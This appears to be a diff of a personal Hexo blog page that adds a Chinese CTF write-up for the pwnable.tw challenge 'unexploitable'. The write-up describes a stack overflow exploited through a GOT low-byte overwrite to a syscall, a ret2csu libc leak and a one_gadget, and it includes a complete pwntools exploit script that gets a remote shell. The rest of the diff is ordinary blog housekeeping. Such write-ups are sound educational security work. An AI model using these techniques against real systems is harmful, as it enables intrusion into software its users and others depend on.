@@ -320,6 +320,183 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/23/unexploitable/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xkaneiki">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xkaneiki's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2020/10/23/unexploitable/" class="post-title-link" itemprop="url">unexploitable</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2020-10-23 15:16:56 / Modified: 15:47:59" itemprop="dateCreated datePublished" datetime="2020-10-23T15:16:56+08:00">2020-10-23</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/网络安全/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>利用ida打开程序会发现如下的情况：</p>
+<p><img src="/2020/10/23/unexploitable/截屏2020-10-23 下午3.18.40.png" alt="截屏2020-10-23 下午3.18.40" style="zoom:50%;"></p>
+<p>主函数有个read函数有个溢出，看了程序的got表发现程序只有read函数并没有输出。</p>
+<p><img src="/2020/10/23/unexploitable/截屏2020-10-23 下午3.18.47.png" alt="截屏2020-10-23 下午3.18.47" style="zoom:50%;"></p>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>考虑修改got表的中read地址的低字节，使它指向一个syscall地址。</p>
+<p>我们先read在libc中的偏移是0xf6670，然后用ropper搜索libc中的syscall：<img src="/2020/10/23/unexploitable/截屏2020-10-23 下午3.27.34.png" alt="截屏2020-10-23 下午3.27.34" style="zoom:50%;"></p>
+<p>可以找到两个和read只有最低一字节不同的syscall的地址，这里我们选用0xf667e来进行利用。</p>
+<p>我们有read函数因此可以从里面向内存中写入数据。用ROPgadget搜索其中的结果<img src="/2020/10/23/unexploitable/截屏2020-10-23 下午3.30.55.png" alt="截屏2020-10-23 下午3.30.55"></p>
+<p>没有可以利用的rop地址，由于不知道libc的基址因此没办法在libc中寻找rop，此时就考虑利用csu_init。<img src="/2020/10/23/unexploitable/截屏2020-10-23 下午3.33.52.png" alt="截屏2020-10-23 下午3.33.52" style="zoom:50%;"></p>
+<p>通过csu_init我们可以设置rdi，rsi，rdx的值，并且可以跳转到指定函数。</p>
+<p>下面就是具体的利用思路了：</p>
+<ol>
+<li>现修改got表中read的最后一个字节为0x7e，使之指向syscall</li>
+<li>由于上一步中只读了一个字节rax返回1，所以记下来再次调用got[‘read’]就会系统调用write。利用此将got表中的地址显示，泄漏出libc的地址</li>
+<li>返回main函数，由于main函数调用read时rax会清0，所以现在当got表中的read指向syscall时也会系统调用read。这样覆盖栈的返回地址为onegadget就能获得shell（注意由于我选onegadget需要rsp+30为0，所以栈溢出的时候多向写写几个0使其满足条件）</li>
+</ol>
+<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x00000000000f667e: syscall; cmp rax, -0xfff; jae 0xf66b9; ret;</span></span><br><span class="line"><span class="string">'0xf6670'</span></span><br><span class="line"><span class="string">通过read构造rax</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">elf = ELF(<span class="string">'./unexploitable'</span>)</span><br><span class="line">p = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10403</span>)</span><br><span class="line"><span class="comment"># p = process('./unexploitable')</span></span><br><span class="line"><span class="comment"># cmd = 'b *0x4005D9\n'</span></span><br><span class="line"><span class="comment"># cmd += 'b *0x400571\n'</span></span><br><span class="line"><span class="comment"># gdb.attach(p, cmd)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">csu1 = <span class="number">0x4005E6</span></span><br><span class="line">csu2 = <span class="number">0x4005D0</span></span><br><span class="line">main = <span class="number">0x400544</span></span><br><span class="line">rg = elf.got[<span class="string">'read'</span>]</span><br><span class="line">print(hex(rg))</span><br><span class="line">payload = (<span class="number">0x10</span>+<span class="number">8</span>)*<span class="string">b'a'</span>+p64(csu1)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">b'a'</span>*<span class="number">8</span> + \</span><br><span class="line">    p64(<span class="number">0</span>)+p64(<span class="number">1</span>) + p64(elf.got[<span class="string">'read'</span>])+p64(<span class="number">0</span>) + \</span><br><span class="line">    p64(elf.got[<span class="string">'read'</span>])+p64(<span class="number">0x1</span>)+p64(csu2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write</span></span><br><span class="line">payload += <span class="string">b'a'</span>*<span class="number">8</span> + \</span><br><span class="line">    p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(elf.got[<span class="string">'read'</span>])+p64(<span class="number">1</span>) + \</span><br><span class="line">    p64(elf.got[<span class="string">'read'</span>])+p64(<span class="number">0x20</span>)+p64(csu2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># back to read</span></span><br><span class="line">payload += <span class="string">b'a'</span>*<span class="number">0x38</span>+p64(main)</span><br><span class="line">p.send(payload.ljust(<span class="number">0x100</span>,<span class="string">b'\x00'</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b'\x7e'</span>)</span><br><span class="line">libc = u64(p.recvn(<span class="number">8</span>))<span class="number">-0xf667e</span></span><br><span class="line">print(<span class="string">'libc'</span>,hex(libc))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x18</span>*<span class="string">b'a'</span>+p64(libc+<span class="number">0x4526a</span>)</span><br><span class="line">p.send(payload.ljust(<span class="number">0x100</span>,<span class="string">b'\0'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/21/rand-heap/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -382,7 +559,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2020-10-22 00:55:11" itemprop="dateModified" datetime="2020-10-22T00:55:11+08:00">2020-10-22</time>
+                <time title="Modified: 2020-10-23 15:45:07" itemprop="dateModified" datetime="2020-10-23T15:45:07+08:00">2020-10-23</time>
               
             
           </span>
@@ -2035,172 +2212,13 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/15/how to post the blog/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="xkaneiki">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xkaneiki's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/04/15/how to post the blog/" class="post-title-link" itemprop="url">Hello World</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-04-15 19:52:26" itemprop="dateCreated datePublished" datetime="2019-04-15T19:52:26+08:00">2019-04-15</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2020-01-24 21:21:25" itemprop="dateModified" datetime="2020-01-24T21:21:25+08:00">2020-01-24</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+  </nav>
+
 
 
           </div>
@@ -2240,7 +2258,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">10</span>
+                    <span class="site-state-item-count">11</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -2288,7 +2306,11 @@
                     
                       
                     
-                    <span class="site-state-item-count">8</span>
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">10</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
@@ -2484,9 +2506,9 @@
       
     
       
-        
-      
     
+      
+        
       
     
       
